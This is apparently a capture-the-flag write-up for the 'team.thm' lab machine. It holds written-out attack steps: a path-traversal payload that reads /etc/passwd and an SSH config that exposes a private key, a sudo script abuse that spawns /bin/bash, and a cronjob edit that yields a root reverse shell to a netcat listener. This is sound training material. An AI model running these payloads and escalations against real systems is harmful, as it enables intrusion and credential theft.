* IP = 10.10.233.233

## Questions/Tasks:

* Starting with basic Nmap scan to find all open ports on the server:<br>
`nmap -sC -sV -v $IP`

* Nmap Scan Results:
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:

```

* Since port 80 is open, search for any other directories with gobuster:<br>
`gobuster -u "http://IP/" -w common.txt`

* GoBuster Scan Results:
```bash
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
```
* FTP is open with no anonymous login permitüòÆ‚Äçüí®.
* The webpage when opened in browser shows the *Apache Default page*:<br>
![Screenshot](./assets/2.png)
* Checking the source of the page, we find this line:<br>
![Screenshot](./assets/1.png)
* Edit the `/etc/hosts` file in your machine and add the line:<br>
```
10.10.233.233 team.thm
```
* Now visiting http://team.thm, we're brought to this page:<br>
![Screenshot](./assets/3.png)
* Start a second gobuster scan on http://team.thm :
* Second Scan results:
```bash
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/assets (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/robots.txt (Status: 200)
/scripts (Status: 301)
/server-status (Status: 403)
```
* Inside *robots.txt* there's only one word: `dale`, maybe its an username.ü§îü§î
* I was completely stuck at this stage, but seeing the hint I figured we need to add `dev.team.thm` to the same line in `/etc/hosts`: `10.10.233.233   dev.team.thm team.thm`
* Opening http://dev.team.thm in browser, we are brought here:<br>
![Screenshot](./assets/4.png)
* Following the hint, I supposed that it might be a Local file inclusion vulnerability, hence tried this payload:<br>
`http://dev.team.thm/script.php?page=./../../../etc/passwd`, since the main webpage remains in `/var/www/html/`, hence we need to traverse 3 times to get into root of filesystem.

* Thus we can confirm that the page has indeed LFI.
* Similarly we tried this out: `http://dev.team.thm/script.php?page=./../../../home/dale/user.txt`.
* And just like that we got the user flag!!ü§ó


1. user.txt

* Now we need to find a way to get a shell in order to become root!!ü´°
* Burp Suite made the job easy and found the list for us:<br>
![Screenshot](./assets/burp.png)
* Hence we visited: `http://dev.team.thm/script.php?page=./../../../etc/ssh/sshd_config` and got a ssh private key for `Dale`:<br>
![Screenshot](./assets/6.png)
* Copy the RSA Private Key to local machine, change permissions with `chmod 600 id_rsa`, then ssh into server with:
`ssh -i id_rsa dale@IP`<br>
![Screenshot](./assets/7.png)
* `sudo -l` gives the following output:<br>
![Screenshot](./assets/8.png)
* So, probably we need to escalate privileges to `Gyles` then to root.
* Carefully look at the script, the error variable is directly executed in the script itself...so we can supply `/bin/bash` and become *gyles*
* Now run the script with `sudo` and supply `/bin/bash` when prompted for date:<br>
![Screenshot](./assets/9.png)
* Thus we can get a barebone shell, and we can elevate the shell with:`python3 -c 'import pty; pty.spawn("/bin/bash")'`
* The `.bash_history` of gyles has a strange file in /usr/local/bin:<br>
![Screenshot](./assets/10.png)
* The `admin` group in which gyles is a member has write, read and execute permissions:<br>
![Screenshot](./assets/11.png)<br>
* Edit the file like this:<br>
![Screenshot](./assets/12.png)
* In order to get a reverse shell with root privileges. (The above code snippet was taken from <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey RevShell Cheat Sheet</a>)
* Set up a netcat listener on local machine with: `nc -lnvp 4444`
* The file will be automatically run by root as it is a *cronjob*.
* Thus we get a root shell connection back:<br>

* Find the root.txt there itself...
